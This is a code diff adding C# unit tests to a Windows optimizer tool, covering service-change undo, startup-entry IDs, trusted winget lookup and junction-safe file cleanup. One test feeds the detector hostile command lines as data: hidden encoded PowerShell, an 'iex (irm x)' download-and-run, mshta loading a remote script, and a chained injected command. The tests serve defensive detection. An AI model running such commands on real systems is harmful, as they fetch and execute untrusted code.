@@ -184,6 +184,76 @@ public class DebloatServicesAppsTests
     }
 
     [Fact]
+    public async Task ChangingAServiceSeveralTimesKeepsOneBackupAndNoFalseDrift()
+    {
+        using var fx = new EngineFixture();
+        fx.Services.Start["LGHUBUpdaterService"] = ServiceStart.Automatic;
+        var vendor = new SignatureInfo(SignatureStatus.Signed, "Logitech Inc", false);
+        ServiceRow Row(ServiceStart s) => new("LGHUBUpdaterService", "LG HUB Updater", null, s, true, @"C:\Program Files\LGHUB\updater.exe", null,
+            CatalogData.Current.Services.Find("LGHUBUpdaterService")) { Signature = vendor };
+        var facts = new Facts().Set("os.build", 26300).Set("elevated", true);
+        var options = new ApplyOptions { ContinueWithoutRestorePoint = true, ExpertMode = true };
+
+        await fx.Engine.ApplyAsync(ServiceManager.Change(Row(ServiceStart.Automatic), ServiceStart.Manual)!, facts, new HashSet<string>(), options);
+        await fx.Engine.ApplyAsync(ServiceManager.Change(Row(ServiceStart.Manual), ServiceStart.Disabled)!, facts, new HashSet<string>(), options);
+        Assert.Equal(ServiceStart.Disabled, fx.Services.Start["LGHUBUpdaterService"]);
+
+        var id = ServiceManager.ChangeId("LGHUBUpdaterService");
+        Assert.Single(fx.Store.All(), b => b.TweakId.StartsWith("service.", StringComparison.Ordinal));
+        Assert.Equal("Automatic", fx.Store.Get(id)!.Entries.Single().Original.Data);
+        Assert.Empty(fx.Engine.CheckDrift(facts)); // the earlier choice (Manual) is not "reset by Windows"
+
+        // Undo goes back to the true original.
+        Assert.True(fx.Engine.Revert(fx.Engine.Resolve(id)!).Success);
+        Assert.Equal(ServiceStart.Automatic, fx.Services.Start["LGHUBUpdaterService"]);
+    }
+
+    [Theory]
+    [InlineData(@"powershell.exe -w hidden -enc SQBFAFgA", true)]
+    [InlineData(@"powershell.exe -ExecutionPolicy Bypass -c ""iex (irm x)""", true)]
+    [InlineData(@"powershell.exe -enc SQBFAFgA C:\Windows\System32\x.ps1", true)]
+    [InlineData(@"powershell.exe -ExecutionPolicy Bypass -File C:\Windows\System32\x.ps1", false)]
+    [InlineData(@"""C:\Windows\system32\cmd.exe"" /d /c C:\Windows\system32\hpatchmonTask.cmd", false)]
+    [InlineData(@"cmd.exe /c C:\Users\x\AppData\Roaming\evil.bat", true)]
+    [InlineData(@"cmd.exe /c C:\Windows\System32\a.cmd & calc.exe", true)]
+    [InlineData(@"cmd.exe /c C:\Windows\System32\..\Temp\x.cmd", true)]
+    [InlineData(@"mshta.exe https://example.invalid/x.hta", true)]
+    [InlineData(@"wscript.exe ""C:\Users\x\AppData\Roaming\x.vbs""", true)]
+    [InlineData(@"C:\Program Files\App\app.exe --minimized", false)]
+    public void ScriptHostEntriesAreFlaggedUnlessTheyOnlyRunSystemFiles(string command, bool flagged)
+    {
+        var windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+        var c = command.Replace(@"C:\Windows", windows, StringComparison.OrdinalIgnoreCase);
+        var image = CommandLine.ImagePath(c);
+        Assert.Equal(flagged, CommandLine.RunsUnverifiedScript(c, image));
+    }
+
+    [Fact]
+    public void RundllTasksResolveToTheirDll()
+    {
+        var windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+        var image = CommandLine.ImagePath($@"""{windows}\system32\rundll32.exe"" %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask");
+        Assert.Equal(Path.Combine(windows, @"system32\AppxDeploymentClient.dll"), image, ignoreCase: true);
+        Assert.False(CommandLine.IsScriptHost(image));
+    }
+
+    [Fact]
+    public void RuntimeIdsDoNotCollide()
+    {
+        // Non-ASCII names and long names that only differ at the end got the same id before.
+        StartupEntry Run(string name) => new(StartupKind.RunKey, name, "x.exe", null, "HKCU Run", Hive.User, true, $@"run:user:Run\{name}") { Target = @"Software\Microsoft\Windows\CurrentVersion\Run" };
+        var a = StartupTweaks.Set(Run("微信"), false)!.Id;
+        var b = StartupTweaks.Set(Run("钉钉"), false)!.Id;
+        Assert.NotEqual(a, b);
+        var longA = StartupTweaks.Set(Run(new string('a', 60) + "1"), false)!.Id;
+        var longB = StartupTweaks.Set(Run(new string('a', 60) + "2"), false)!.Id;
+        Assert.NotEqual(longA, longB);
+        Assert.Equal(TweakIds.Slug("Spooler"), TweakIds.Slug("SPOOLER")); // service and registry names are case-insensitive
+        Assert.NotEqual(ServiceManager.ChangeId("Svc"), ServiceManager.ChangeId("Svc_1"));
+        Assert.NotEqual(TweakIds.Slug(@"PCI\VEN_10DE&DEV_1F02&SUBSYS_00000000&REV_A1\4&1&0&0008"), TweakIds.Slug(@"PCI\VEN_10DE&DEV_1F02&SUBSYS_00000000&REV_A1\4&1&0&0009"));
+    }
+
+    [Fact]
     public void SpoolerPresetIsBlockedWithPrinters()
     {
         using var fx = new EngineFixture();
@@ -192,6 +262,32 @@ public class DebloatServicesAppsTests
         Assert.Contains(fx.Engine.Preflight(t, facts, new HashSet<string>(), new ApplyOptions()), b => b.ReasonKey == "block.printersInstalled");
         Assert.DoesNotContain(fx.Engine.Preflight(t, new Facts().Set("os.build", 26300).Set("elevated", true).Set("printers.count", 0), new HashSet<string>(), new ApplyOptions()),
             b => b.ReasonKey == "block.printersInstalled");
+    }
+
+    [Fact]
+    public void ElevatedWingetComesOnlyFromTheProtectedPackageFolder()
+    {
+        var apps = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "WindowsApps");
+        Assert.Equal(new Version(1, 29, 380, 0), Winget.PackageVersion("Microsoft.DesktopAppInstaller_1.29.380.0_x64__8wekyb3d8bbwe"));
+        Assert.Null(Winget.PackageVersion("Microsoft.DesktopAppInstaller_1.29.380.0_neutral_split.language-de_8wekyb3d8bbwe"));
+        // A folder outside Program Files\WindowsApps (for example in the user's profile) is never used.
+        var userFolder = Path.Combine(Path.GetTempPath(), "Microsoft.DesktopAppInstaller_9.0.0.0_x64__8wekyb3d8bbwe");
+        Directory.CreateDirectory(userFolder);
+        System.IO.File.WriteAllText(Path.Combine(userFolder, "winget.exe"), "");
+        try
+        {
+            Assert.Null(Winget.FindTrusted([("Microsoft.DesktopAppInstaller_9.0.0.0_x64__8wekyb3d8bbwe", userFolder)]));
+        }
+        finally
+        {
+            Directory.Delete(userFolder, true);
+        }
+        // On this PC (read-only): if App Installer is registered, the result is its package folder, never the alias.
+        if (Winget.FindTrusted() is { } found)
+        {
+            Assert.StartsWith(apps + "\\", found, StringComparison.OrdinalIgnoreCase);
+            Assert.DoesNotContain(@"\AppData\", found, StringComparison.OrdinalIgnoreCase);
+        }
     }
 
     [Fact]
@@ -294,6 +390,69 @@ public class CleanupStorageTests : IDisposable
         Assert.True(System.IO.File.Exists(keep));        // never reached through the junction
         Assert.False(Directory.Exists(Path.Combine(temp, "sub"))); // emptied subfolder removed
         Assert.True(Directory.Exists(temp));             // root kept
+    }
+
+    private static void Junction(string link, string target)
+    {
+        var mk = Process.Start(new ProcessStartInfo("cmd.exe", $"/c mklink /J \"{link}\" \"{target}\"") { CreateNoWindow = true, UseShellExecute = false })!;
+        mk.WaitForExit();
+        Assert.True(Directory.Exists(link));
+    }
+
+    [Fact]
+    public void CleanupSkipsARootThatIsOrLiesUnderAJunction()
+    {
+        // %LOCALAPPDATA%\Temp (or a parent like %LOCALAPPDATA%\NVIDIA) replaced by a junction to a protected folder.
+        var keep = File(@"protected\program.dll", 10, DateTime.UtcNow.AddDays(-30));
+        var keep2 = File(@"protected\DXCache\shader.bin", 10, DateTime.UtcNow.AddDays(-30));
+        var temp = Path.Combine(_root, "Temp");
+        Junction(temp, Path.Combine(_root, "protected"));
+        var nvidia = Path.Combine(_root, "NVIDIA");
+        Junction(nvidia, Path.Combine(_root, "protected"));
+
+        var category = new CleanupCategory("cleanup.test", [temp, Path.Combine(nvidia, "DXCache")]);
+        Assert.Equal(0, CleanupEngine.Scan(category).Files);
+        Assert.Equal(0, CleanupEngine.Clean(category).Deleted);
+        Assert.True(System.IO.File.Exists(keep));
+        Assert.True(System.IO.File.Exists(keep2));
+    }
+
+    [Fact]
+    public void BackupFolderLinksAreRemovedWithoutTouchingTargets()
+    {
+        // A standard user pre-created the backup root (or a subfolder) as a junction to a folder they control.
+        var userFiles = Path.Combine(_root, "user");
+        var planted = File(@"user\backups\x.json", 10);
+        var root = Path.Combine(_root, "PCOptimizer");
+        Junction(root, userFiles);
+        Optimizer.Core.Backup.SecureFolder.RemoveLinks(root);
+        Assert.False(Directory.Exists(root));
+        Assert.True(System.IO.File.Exists(planted)); // the target is left alone
+
+        Directory.CreateDirectory(root);
+        Junction(Path.Combine(root, "backups"), Path.Combine(userFiles, "backups"));
+        Optimizer.Core.Backup.SecureFolder.RemoveLinks(root);
+        Assert.False(Directory.Exists(Path.Combine(root, "backups")));
+        Assert.True(System.IO.File.Exists(planted));
+    }
+
+    [Fact]
+    public void SafeDeleteRefusesAPathThatResolvesElsewhere()
+    {
+        // The scan saw temp\sub\old.tmp; then sub was swapped for a junction to a protected folder with the same file name.
+        var victim = File(@"protected\old.tmp", 10);
+        Directory.CreateDirectory(Path.Combine(_root, "temp"));
+        var sub = Path.Combine(_root, @"temp\sub");
+        Junction(sub, Path.Combine(_root, "protected"));
+        Assert.Throws<IOException>(() => Optimizer.Core.Platform.SafeDelete.DeleteFile(Path.Combine(sub, "old.tmp")));
+        Assert.True(System.IO.File.Exists(victim));
+        Assert.False(Optimizer.Core.Platform.SafeDelete.HasNoLinks(Path.Combine(sub, "old.tmp")));
+
+        // A normal read-only file is deleted.
+        var ro = File(@"temp\readonly.tmp", 10);
+        System.IO.File.SetAttributes(ro, FileAttributes.ReadOnly);
+        Optimizer.Core.Platform.SafeDelete.DeleteFile(ro);
+        Assert.False(System.IO.File.Exists(ro));
     }
 
     [Fact]
